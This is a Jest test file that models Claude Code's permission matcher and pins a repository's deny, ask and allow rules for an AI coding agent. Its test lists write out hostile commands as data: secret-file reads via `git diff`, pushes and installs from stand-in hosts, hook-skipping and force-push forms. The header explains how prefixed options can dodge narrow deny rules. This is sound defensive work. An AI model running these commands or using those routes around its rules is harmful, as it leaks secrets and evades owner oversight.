'use strict';

// OPS-171 — the policy that pins `.claude/settings.json` `permissions`, and the `attribution` and
// `sessionUrl` values whose wrong type makes the runtime silently drop the whole file, deny list
// and hooks included.
//
// What the policy closes (security-auditor SEC-264-L4 and SEC-264-L1 on #264; SEC-270-01 to -10,
// RA-2, RA-7, CU270-02 and F6 on #270): a secret read through the file tools (Read and Edit denies
// for the J4 shapes), a secret read through an allowed git form (`--no-index` denied; the implicit
// no-index of `git diff <outside path> <file>` asked), a file published through an allowed gh form
// (`gh pr merge` with a body, subject or author flag denied; `gh pr create|comment|edit|close|
// review`, `gh gist|api|secret|release|repo` asked), a force or refspec fetch, a git escape hatch
// (`--output`, `--ext-diff`, `--exec`, `add --force`), and the destructive forms DEC-145 names.
// What it does not close: `npm run`, `npm test`, `npm ci`, `npm install`, `npm --prefix <pkg> ci`,
// `npx jest`, `./node_modules/.bin/jest` and `./node_modules/.bin/tsc` execute repository code and
// no deny reaches a subprocess; the owner's ruling F2 B accepts that development surface.
//
// It reads the committed settings and runs a conservative model of Claude Code's permission
// matcher (https://code.claude.com/docs/en/permissions, read 2026-10-21): deny is evaluated first,
// then ask, then allow, and the first match decides. A Bash/PowerShell rule's `*` matches any text,
// a trailing ` *` (space before, and the only wildcard) also matches the bare command, and a `*`
// before a subcommand — as in `Bash(git * main)` — matches every option in its place, including
// `-c <k>=<v>` and `-C <dir>`, which is how an option-prefixed form dodges a narrow `git push …`
// deny. Read/Edit rules use gitignore semantics; on Windows paths normalise to POSIX, so `//c/**`.
// PowerShell rules match case-insensitively, so a PowerShell rule cannot tell `-d` from `-D`.
//
// The model is deliberately conservative: it never strips wrappers, redirections or environment
// assignments before matching an allow rule, so it can under-approve what an allow rule covers
// (safe for the "must not be auto-allowed" checks) and is pinned against the documentation's own
// examples by the matcher self-test below. It does not model PowerShell alias canonicalisation;
// our rules and the commands checked here use canonical forms. Known limits, by design:
//  - an exact-form allow (`./node_modules/.bin/jest`, `git merge --no-edit origin/main`, `ps -W`)
//    matches the bare string only; whether the runtime strips a redirection such as `2>&1` before
//    matching is not modelled here — the live capture on the PR records what the runtime did;
//  - a starred deny reads free text too, so a commit message that spells a denied token is refused
//    (`git commit -m "never git push origin main again"` matches `git *push * main *`): reword the
//    message. Only a quote-aware matcher would lift this, and the runtime's is not;
//  - this model and the one in `.claude/hooks/merge-guard-trigger.test.mjs` (`globMatch`) differ
//    on one rule: here a trailing ` *` matches the bare command (`npm test` under `npm test *`),
//    there it needs the space. At most one is the runtime's reading; the live capture's `npm test`
//    item settles it, and a shared model is a later row. Every deny is written so that it holds
//    under both readings (`backend/tests/shadow.claudeSettings.policy.test.js` pins that).
//
// The commands that carry the owner's absolute paths — CLAUDE.md step 2's three strings and its
// L-check, the sentinel's five strings of step 3, the adb rules — are never quoted here:
// `backend/tests/personalDataGuard.test.js` counts every absolute user path in a tracked file. They
// are derived from the allow list and from CLAUDE.md by path-free patterns, and pinned against each
// other below.

const fs = require('fs');
const path = require('path');

const ROOT = path.resolve(__dirname, '..', '..');
const SETTINGS_PATH = path.join(ROOT, '.claude', 'settings.json');
const raw = fs.readFileSync(SETTINGS_PATH, 'utf8');
const settings = JSON.parse(raw);
const perm = settings.permissions || {};
const allow = perm.allow || [];
const ask = perm.ask || [];
const deny = perm.deny || [];

const TOOLS = ['Bash', 'PowerShell'];

function escapeRegExp(s) {
  return s.replace(/[.+?^${}()|[\]\\]/g, '\\$&');
}

// A Bash/PowerShell specifier → anchored regex. `*` → `.*`; a trailing ` *` that is the only
// wildcard makes the preceding space optional so the rule also matches the bare command.
function shellSpecToRegex(spec, caseInsensitive) {
  let work = spec;
  let trailingOptional = false;
  if (work.endsWith(' *') && !work.slice(0, -2).includes('*')) {
    work = work.slice(0, -2);
    trailingOptional = true;
  }
  const body = work.split('*').map(escapeRegExp).join('.*');
  return new RegExp('^' + body + (trailingOptional ? '(?: .*)?' : '') + '$', caseInsensitive ? 'is' : 's');
}

// A Read/Edit gitignore-style glob → anchored regex over a POSIX path. `**/` is any number of
// leading directories, `**` is any depth, `*` stays within one segment.
function pathGlobToRegex(glob) {
  let g = glob;
  let out = '^';
  if (g.startsWith('//')) { out += '/'; g = g.slice(2); }
  for (let i = 0; i < g.length; i += 1) {
    const c = g[i];
    if (c === '*') {
      if (g[i + 1] === '*') {
        if (g[i + 2] === '/') { out += '(?:.*/)?'; i += 2; } else { out += '.*'; i += 1; }
      } else {
        out += '[^/]*';
      }
    } else if ('.+?^${}()|[]\\'.includes(c)) {
      out += '\\' + c;
    } else {
      out += c;
    }
  }
  return new RegExp(out + '$');
}

function specsFor(list, tool) {
  const head = tool + '(';
  return list.filter((r) => r.startsWith(head) && r.endsWith(')')).map((r) => r.slice(head.length, -1));
}

// Deny → ask → allow, first match wins; default is a prompt in Manual mode.
function shellDecision(command, tool) {
  const ci = tool === 'PowerShell';
  const hits = (list) => specsFor(list, tool).some((spec) => shellSpecToRegex(spec, ci).test(command));
  if (hits(deny)) return 'deny';
  if (hits(ask)) return 'ask';
  if (hits(allow)) return 'allow';
  return 'prompt';
}

function fileDecision(p, tool) {
  const hits = (list) => specsFor(list, tool).some((spec) => pathGlobToRegex(spec).test(p));
  if (hits(deny)) return 'deny';
  if (hits(ask)) return 'ask';
  return 'allow';
}
const readDecision = (p) => fileDecision(p, 'Read');
const editDecision = (p) => fileDecision(p, 'Edit');

// ---- the owner's-path commands, derived rather than quoted (see the header) -------------------
function one(list, what) {
  if (list.length !== 1) throw new Error(`expected exactly one ${what}, found ${list.length}: ${list.join(' | ')}`);
  return list[0];
}
const allowCommands = specsFor(allow, 'Bash');
const allowedWhere = (pred, what) => one(allowCommands.filter(pred), what);
// CLAUDE.md session-start step 2: the three exact allows, selected by their git form.
const STEP2_SUFFIXES = [' symbolic-ref --short HEAD', ' status --porcelain --untracked-files=no', ' merge --ff-only origin/main'];
const STEP2_COMMANDS = STEP2_SUFFIXES.map((suffix) =>
  allowedWhere((c) => c.startsWith('git -C ') && c.endsWith(suffix), `step-2 allow ending in "${suffix}"`));
// CLAUDE.md session-start step 3 — .claude/agents/sentinel.md § FILING: the five exact allows that
// read or reset the sentinel's worktree with the hooks of that tree disabled.
const SENTINEL_COMMANDS = allowCommands.filter((c) => c.startsWith('git -c core.hooksPath=/dev/null') && c.includes('/.claude/worktrees/sentinel '));
// The adb rules name the SDK's platform-tools binary by its absolute path; the path is one.
const ADB_MARK = '/platform-tools/adb.exe ';
const ADB = one([...new Set(allowCommands.filter((c) => c.includes(ADB_MARK)).map((c) => c.slice(0, c.indexOf(ADB_MARK) + ADB_MARK.length - 1)))], 'adb path');
// CLAUDE.md's own text of step 2: the line that begins its item 2, its backticked strings.
const CLAUDE_MD = fs.readFileSync(path.join(ROOT, 'CLAUDE.md'), 'utf8');
const STEP2_LINE = CLAUDE_MD.split('\n').find((l) => /^2\. The owner's machine only/.test(l)) || '';
const STEP2_STRINGS = [...STEP2_LINE.matchAll(/`([^`]+)`/g)].map((m) => m[1]);
const stepTwoString = (pred, what) => one(STEP2_STRINGS.filter((s) => s.startsWith('git -C ') && pred(s)), `CLAUDE.md step-2 string ${what}`);
const CLAUDE_STEP2_COMMANDS = STEP2_SUFFIXES.map((suffix) => stepTwoString((s) => s.endsWith(suffix), `ending in "${suffix}"`));
const CLAUDE_L_CHECK = stepTwoString((s) => s.includes(' diff --quiet <L> HEAD -- '), 'with the L-check').replace('<L>', 'L');

describe('OPS-171 settings policy — matcher self-test (pins the model against the docs)', () => {
  const m = (spec, cmd) => shellSpecToRegex(spec, false).test(cmd);

  it('trailing " *" matches the bare command and the family, but not a sibling', () => {
    expect(m('npm run *', 'npm run build')).toBe(true);
    expect(m('npm run *', 'npm run')).toBe(true);
    expect(m('npm run *', 'npm install')).toBe(false);
  });

  it('an exact rule matches only the exact command', () => {
    expect(m('npm run build', 'npm run build')).toBe(true);
    expect(m('npm run build', 'npm run build --watch')).toBe(false);
    expect(m('ps -W', 'ps -W | grep -ci claude')).toBe(false);
  });

  it('a "*" before the subcommand stands in for every option, including -c and -C', () => {
    expect(m('git * main', 'git merge main')).toBe(true);
    expect(m('git * main', 'git push origin main')).toBe(true);
    expect(m('git * main', 'git -c core.fsmonitor=x diff main')).toBe(true);
    expect(m('git * main', 'git -C /some/dir push origin main')).toBe(true);
    expect(m('git * main', 'git log')).toBe(false);
  });

  it('a "*" glued to the subcommand covers the -C and -c prefixed spellings', () => {
    expect(m('git *diff */dev/null*', 'git -C /x diff /dev/null y')).toBe(true);
    expect(m('git *diff */dev/null*', 'git -c a=b diff /dev/null y')).toBe(true);
    expect(m('git *diff */dev/null*', 'git -c a=b -C /x diff --quiet /dev/null y')).toBe(true);
    expect(m('git *diff */dev/null*', 'git diff --quiet origin/main -- x')).toBe(false);
  });

  it('a mid-rule "*" does not make the trailing one match the bare command', () => {
    expect(m('git log * main', 'git log --oneline main')).toBe(true);
    expect(m('git log * main', 'git log main')).toBe(false);
    expect(m('git log * main', 'git push origin main')).toBe(false);
    expect(m('* --help *', 'npm --help x')).toBe(true);
    expect(m('* --help *', 'npm --help')).toBe(false);
  });

  it('a "*" in the program slot matches any program; the space rule holds', () => {
    expect(m('* --version', 'node --version')).toBe(true);
    expect(m('* --version', 'node -v')).toBe(false);
    expect(m('ls *', 'ls -la')).toBe(true);
    expect(m('ls *', 'ls')).toBe(true);
    expect(m('ls *', 'lsof')).toBe(false);
    expect(m('ls*', 'lsof')).toBe(true);
  });

  it('PowerShell rules match case-insensitively, so -d and -D are one token there', () => {
    expect(shellSpecToRegex('git branch -D*', true).test('git branch -d x')).toBe(true);
    expect(shellSpecToRegex('git branch -D*', false).test('git branch -d x')).toBe(false);
  });

  it('Read globs follow gitignore depth semantics', () => {
    const blocks = (glob, p) => pathGlobToRegex(glob).test(p);
    expect(blocks('**/.env', '.env')).toBe(true);
    expect(blocks('**/.env', 'backend/app/.env')).toBe(true);
    expect(blocks('**/.env', '.env.example')).toBe(false);
    expect(blocks('**/.env', 'env')).toBe(false);
    expect(blocks('**/*.keystore', 'a/b/release.keystore')).toBe(true);
    expect(blocks('**/*.keystore', 'a/b/keystore')).toBe(false);
    expect(blocks('//c/KokonadaSigner/**', '/c/KokonadaSigner/release.jks')).toBe(true);
    expect(blocks('//c/KokonadaSigner/**', '/c/other/release.jks')).toBe(false);
  });
});

describe('OPS-171 settings policy — structure (a wrong value silently drops the whole file)', () => {
  it('attribution.commit and attribution.pr are the empty string, sessionUrl is a boolean', () => {
    expect(settings.attribution).toBeDefined();
    expect(typeof settings.attribution.commit).toBe('string');
    expect(typeof settings.attribution.pr).toBe('string');
    expect(settings.attribution.commit).toBe('');
    expect(settings.attribution.pr).toBe('');
    expect(typeof settings.attribution.sessionUrl).toBe('boolean');
  });

  it('includeCoAuthoredBy is false', () => {
    expect(settings.includeCoAuthoredBy).toBe(false);
  });

  it('the deny list is non-empty and carries every DEC-145 deny (DEC-145.md:63) for Bash and PowerShell', () => {
    expect(deny.length).toBeGreaterThan(0);
    const dec145 = [
      'git push --force*',
      'git push -f*',
      'git push --force-with-lease*',
      'git push origin main*',
      'git push * main',
      'git push * HEAD:main*',
      'git reset --hard*',
      'git clean*',
      'git stash drop*',
      'git stash clear*',
      'gh pr merge * --admin*',
    ];
    for (const r of dec145) {
      expect(deny).toContain(`Bash(${r})`);
      expect(deny).toContain(`PowerShell(${r})`);
    }
  });

  it('no allow rule puts a "*" where a git subcommand belongs, nor as the value of -C or -c', () => {
    const offenders = [];
    for (const r of [...specsFor(allow, 'Bash'), ...specsFor(allow, 'PowerShell')]) {
      const tokens = r.split(/\s+/);
      if (tokens[0] !== 'git') continue;
      let i = 1;
      while (tokens[i] === '-C' || tokens[i] === '-c') {
        // `git -C * push *` or `git -c * …` would stand in for any directory or any config key.
        if (!tokens[i + 1] || tokens[i + 1].includes('*')) offenders.push(r);
        i += 2;
      }
      if (tokens[i] === '*' || (tokens[i] && tokens[i].startsWith('*'))) offenders.push(r);
    }
    expect(offenders).toEqual([]);
  });

  it('no allow rule begins with an environment assignment (VAR=… dodges allow matching)', () => {
    const offenders = [...specsFor(allow, 'Bash'), ...specsFor(allow, 'PowerShell')]
      .filter((r) => /^[A-Za-z_][A-Za-z0-9_]*=/.test(r));
    expect(offenders).toEqual([]);
  });

  it('no allow entry is a bare tool name or Tool(*) (that would allow everything the tool does)', () => {
    const bare = allow.filter((r) => /^[A-Za-z_]+$/.test(r) || /^[A-Za-z_]+\(\s*\*+\s*\)$/.test(r));
    expect(bare).toEqual([]);
  });

  it('every Read deny has an Edit twin and every Edit deny a Read twin', () => {
    for (const r of specsFor(deny, 'Read')) expect(deny).toContain(`Edit(${r})`);
    for (const r of specsFor(deny, 'Edit')) expect(deny).toContain(`Read(${r})`);
  });

  it('no Read allow reaches outside the repo except //tmp, and none at //k/ or AI-Music-App', () => {
    const outside = specsFor(allow, 'Read').filter((r) => r.startsWith('//') && !r.startsWith('//tmp/'));
    expect(outside).toEqual([]);
    const stale = specsFor(allow, 'Read').filter((r) => r.startsWith('//k/') || r.includes('AI-Music-App'));
    expect(stale).toEqual([]);
  });

  it('the step-2 allows are exactly the three strings CLAUDE.md step 2 names, and the L-check is not among them', () => {
    expect(STEP2_COMMANDS).toEqual(CLAUDE_STEP2_COMMANDS);
    expect(CLAUDE_L_CHECK).toContain(' diff --quiet L HEAD -- ');
    expect(allowCommands).not.toContain(CLAUDE_L_CHECK);
  });

  it('the sentinel has exactly five exact allows and the adb rules share one binary path', () => {
    expect(SENTINEL_COMMANDS).toHaveLength(5);
    expect(SENTINEL_COMMANDS.every((c) => !c.includes('*'))).toBe(true);
    expect(allowCommands.filter((c) => c.startsWith(`${ADB} `))).toHaveLength(5);
  });
});

describe('OPS-171 settings policy — secrets are not readable or editable, the example file stays both', () => {
  const denied = [
    'mobile/KokonadaHealth/android/keystore.properties',
    'x/kokonada-release.keystore',
    'x.jks',
    'x.p12',
    'x.p8',
    'x.pem',
    'x.key',
    'x.pfx',
    '.env',
    '.env.local',
    'backend/.env.production',
    'backend/.env.development',
    'backend/.env.test',
    '.env.staging',
    '.env.prod',
    '.env.dev',
    '.env.bak',
    '.env.backup',
    '.env.orig',
    '.env.production.local',
    'x/google-services.json',
    'ios/GoogleService-Info.plist',
    '/c/KokonadaSigner/release.jks',
  ];
  for (const p of denied) {
    it(`Read and Edit are denied: ${p}`, () => {
      expect(readDecision(p)).toBe('deny');
      expect(editDecision(p)).toBe('deny');
    });
  }

  it('backend/.env.example stays readable and editable', () => {
    expect(readDecision('backend/.env.example')).not.toBe('deny');
    expect(editDecision('backend/.env.example')).not.toBe('deny');
  });
});

describe('OPS-171 settings policy — exfiltration and destructive commands are not auto-allowed', () => {
  // Each of these must be blocked outright (a prompt is not enough: the fix adds an explicit deny).
  // The git -c … rows pin SEC-264 M5: an inline-config prefix must not dodge the destructive denies.
  const mustDeny = [
    'git diff --no-index /dev/null x',
    'git -c core.hooksPath=/dev/null diff --no-index /dev/null x',
    'git checkout -- .',
    'git stash pop',
    'git stash apply',
    'git add -f x',
    'git add x -f',
    'git commit --no-verify -m x',
    'git fetch --upload-pack=x .',
    'git ls-remote --upload-pack=x .',
    'git -c core.hooksPath=/dev/null push --force origin x',
    'git -c core.hooksPath=/dev/null push origin main',
    'git -c core.hooksPath=/dev/null reset --hard HEAD',
    'gh pr update-branch --rebase 1',
    'gh pr update-branch 1 --rebase',
    // SEC-270-09: a fetch refspec that force-moves or writes a local branch.
    'git fetch origin +refs/heads/x:refs/heads/y',
    'git fetch origin refs/heads/x:refs/heads/y',
    'git fetch origin -u x:refs/heads/y',
    'git fetch origin +x:y',
    'git -C /x fetch origin +a:b',
    // SEC-270-02, route (b): the /merge form stays allowed (below); any body, subject or author
    // flag — which would publish a file's bytes as the squash message on main — is denied.
    'gh pr merge 1 --squash --delete-branch --match-head-commit abc --body-file x',
    'gh pr merge 1 --squash --delete-branch --match-head-commit abc --body x',
    'gh pr merge 1 --squash --delete-branch --match-head-commit abc --body=x',
    'gh pr merge 1 --squash --delete-branch --match-head-commit abc -F x',
    'gh pr merge 1 --squash --delete-branch --match-head-commit abc -b x',
    'gh pr merge 1 --squash --delete-branch --match-head-commit abc --subject x',
    'gh pr merge 1 --squash --delete-branch --match-head-commit abc -t x',
    'gh pr merge 1 --squash --delete-branch --match-head-commit abc --author-email x',
    'gh pr merge 1 --squash --delete-branch --match-head-commit abc -A x',
    'gh pr merge --body-file x 1 --squash --delete-branch --match-head-commit abc',
    'gh pr merge -F x 1 --squash --delete-branch --match-head-commit abc',
    // F6: auto-merge would merge later, outside the GREEN verdict's H and M.
    'gh pr merge 1 --auto --squash --delete-branch --match-head-commit X',
    'gh pr merge 1 --squash --delete-branch --match-head-commit X --auto',
    'gh pr merge --auto 1',
  ];
  for (const tool of TOOLS) {
    for (const cmd of mustDeny) {
      it(`${tool} denied: ${cmd}`, () => {
        expect(shellDecision(cmd, tool)).toBe('deny');
      });
    }
  }

  // Each of these must at least not run without a prompt (deny or ask or prompt — never allow).
  const mustNotAllow = [
    'git stash push --all -- x',
    'git push origin "stash@{0}^3:refs/heads/x"',
    'git push https://example.invalid/r HEAD',
    'git update-index --add x',
    'gh pr comment 1 --body-file x',
    'gh pr create --body-file x',
    'npm install https://example.invalid/x.tgz',
    'ADB="/c/x/adb.exe" cat x',
    'git pull https://example.invalid/r',
    // SEC-270-01: git enters no-index mode by itself when a path lies outside the working tree,
    // so a plain `git diff` reads any file. The kept `git diff *` allow must not reach these.
    'git diff /dev/null backend/.env',
    'git diff --quiet /dev/null backend/.env',
    'git diff --text /dev/null x.jks',
    'git diff C:/x C:/y',
    'git diff /c/x y',
    'git diff ~/.ssh/id_ed25519 x',
    'git diff nul backend/.env',
    'git diff -a /dev/null x.jks',
    // SEC-270-05: the two package forms are exact; any other --prefix (a review tree, a temp
    // directory), and npx tsc, prompt.
    'npm --prefix /tmp/x ci',
    'npm --prefix /mnt/review/x ci',
    'npm --prefix C:/review/x ci',
    'npx tsc -p /tmp/x',
    'npx tsc',
    // Rows that rest on the absence of an allow alone (no ask or deny shadows them): a widened
    // `Bash(gh pr *)`, `PowerShell(gh pr *)` or `*(git push *)` allow turns these red.
    'gh pr merge 1 --squash',
    'gh pr merge 1 --squash --delete-branch',
    'gh pr merge 1 --merge --delete-branch --match-head-commit abc',
    'gh pr merge 1 --rebase --delete-branch --match-head-commit abc',
    'gh pr reopen 1',
    'gh pr lock 1',
    'git push --tags',
    'git push origin x',
    'git push origin HEAD:refs/heads/x',
    'git fetch https://example.invalid/r',
    'git ls-remote https://example.invalid/r',
  ];
  for (const tool of TOOLS) {
    for (const cmd of mustNotAllow) {
      it(`${tool} not auto-allowed: ${cmd}`, () => {
        expect(shellDecision(cmd, tool)).not.toBe('allow');
      });
    }
  }

  // Each of these hits an ask rule: a prompt in every mode, bypass included, and one that beats any
  // allow in the owner's local or user settings — stronger than the default prompt of no match.
  const mustAsk = [
    'git -C /x diff /dev/null y',
    'git -c a=b diff /dev/null y',
    'git diff /dev/null backend/.env',
    'gh pr comment 1 --body-file x',
    'gh pr edit 1 --body-file x',
    'gh pr create --fill',
    'gh pr close 1',
    'gh pr review 1 --approve',
    // SEC-270-10: the other gh verbs that publish bytes or change the repository.
    'gh gist create x',
    'gh api repos/DanielMalede/Kokonada/issues -f title=x',
    'gh secret set X',
    'gh release create v1 x',
    'gh repo delete x',
    // CU270-02: a force delete, and every force form under the allowed `git branch -d *`, asks.
    'git branch -D x',
    'git -C /x branch -D y',
    'git branch -d -f x',
    'git branch -d x -f',
    'git branch -d --force x',
    'git branch -d x --force',
    'git branch -d -D x',
    'git branch --delete --force x',
  ];
  for (const tool of TOOLS) {
    for (const cmd of mustAsk) {
      it(`${tool} asks: ${cmd}`, () => {
        expect(shellDecision(cmd, tool)).toBe('ask');
      });
    }
  }

  it('an ordinary commit carrying a -c option is not denied (M5 must not over-reach)', () => {
    expect(shellDecision('git -c user.name=x commit -m msg', 'Bash')).not.toBe('deny');
  });

  it('a commit message that spells a denied token is refused by the starred denies (reword it)', () => {
    expect(shellDecision('git commit -m "never git push origin main again"', 'Bash')).toBe('deny');
    expect(shellDecision('git commit -m "chore: reword the message that tripped a deny"', 'Bash')).not.toBe('deny');
  });
});

describe('OPS-171 settings policy — the flows keep working', () => {
  const MERGE_FORM = 'gh pr merge 1 --squash --delete-branch --match-head-commit 0123456789abcdef0123456789abcdef01234567';
  const stillAllowed = [
    // CLAUDE.md session-start step 2, the three fast-forward strings (derived; pinned equal to
    // CLAUDE.md's text in the structure block):
    ...STEP2_COMMANDS,
    // CLAUDE.md session-start step 3 — .claude/agents/sentinel.md § FILING, the five strings (derived):
    ...SENTINEL_COMMANDS,
    // CLAUDE.md steps 1, 5 and 6, /ship, /review-pr, /merge and merge-guard:
    'git fetch origin --prune',
    'git fetch origin',
    'git fetch --unshallow',
    'git fetch origin pull/264/head',
    'git ls-remote origin',
    'git ls-remote origin refs/heads/main',
    'git merge origin/main',
    'git merge --no-edit origin/main',
    'git push',
    'git push -u origin HEAD',
    'git push origin HEAD',
    'git branch --show-current',
    'git branch --list',
    'git branch -d fix/ops171-settings-policy',
    'git rev-list --count HEAD',
    'git fsck --no-dangling',
    'git check-ignore -v x',
    'gh pr view 1 --json state',
    'gh pr list --state open',
    'gh pr checks 270',
    'gh pr diff 270 --name-only',
    'gh pr status',
    'gh pr update-branch 270',
    MERGE_FORM,
    'gh pr ready 1',
    'npm test',
    'npm ci',
    'npm install',
    'npm run lint',
    'npm run lint:design-system',
    'npm --prefix backend ci',
    'npm --prefix mobile/KokonadaHealth ci',
    'npx jest tests/x.test.js',
    './node_modules/.bin/jest', // /ship step 2: the mobile jest gate, run in mobile/KokonadaHealth
    './node_modules/.bin/tsc --noEmit -p tsconfig.json', // /ship step 2: the mobile tsc gate, exact
    'ps -W', // the custodian's precondition 3
    `${ADB} logcat -d`,
    `${ADB} reverse tcp:8081 tcp:8081`,
    // git diff on repository paths and revisions stays unprompted; only outside paths ask.
    'git diff --quiet A B -- x',
    'git diff --stat',
    'git diff --stat origin/main...HEAD',
    'git diff origin/main -- TASKS.md',
    'git diff HEAD~1 -- backend/app/index.js',
    'git diff --cached --no-color --no-ext-diff',
    'git status --porcelain',
  ];
  for (const cmd of stillAllowed) {
    it(`Bash still allowed: ${cmd}`, () => {
      expect(shellDecision(cmd, 'Bash')).toBe('allow');
    });
    // The allows are Bash rules and the flows run in Bash; the PowerShell twin may prompt, but a
    // PowerShell deny on a flow string would be a rule written too wide.
    it(`PowerShell never denies: ${cmd}`, () => {
      expect(shellDecision(cmd, 'PowerShell')).not.toBe('deny');
    });
  }

  it('the /merge step-4 form is allowed and matches no deny, while every body spelling is denied', () => {
    expect(shellDecision(MERGE_FORM, 'Bash')).toBe('allow');
    expect(shellDecision(MERGE_FORM, 'PowerShell')).not.toBe('deny');
    expect(specsFor(deny, 'Bash').filter((s) => shellSpecToRegex(s, false).test(MERGE_FORM))).toEqual([]);
    for (const flag of ['--body ""', '--body-file x', '-F x', '-b x', '--subject x', '-t x', '--author-email x', '-A x']) {
      expect(shellDecision(`${MERGE_FORM} ${flag}`, 'Bash')).toBe('deny');
    }
  });

  it('in PowerShell, git branch -d asks (its rules cannot tell -d from -D)', () => {
    expect(shellDecision('git branch -d x', 'PowerShell')).toBe('ask');
  });

  it('the CLAUDE.md step-2 L-check (its text, with L substituted) prompts: no rule matches it in either direction', () => {
    expect(shellDecision(CLAUDE_L_CHECK, 'Bash')).toBe('prompt');
    expect(shellDecision(CLAUDE_L_CHECK, 'PowerShell')).not.toBe('deny');
  });

  it('the /claim coordinator invocation is never newly blocked (deny or ask)', () => {
    const coord = 'node scripts/coord/coord.js status';
    expect(['allow', 'prompt']).toContain(shellDecision(coord, 'Bash'));
  });
});
